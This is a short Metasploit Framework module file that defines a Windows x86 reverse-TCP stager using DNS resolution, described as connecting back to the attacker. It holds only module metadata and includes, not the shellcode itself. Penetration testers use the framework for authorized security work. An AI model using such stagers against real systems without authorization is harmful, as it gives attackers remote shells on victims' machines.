##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/reverse_tcp_dns'

module MetasploitModule

  CachedSize = 335

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcpDns

  def self.handler_type_alias
    "reverse_tcp_dns"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager (DNS)',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['hdm', 'skape', 'sf', 'RageLtMan'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'sockedi',
      'Stager'        =>
        { 'RequiresMidstager' => false }
      ))

  end
end
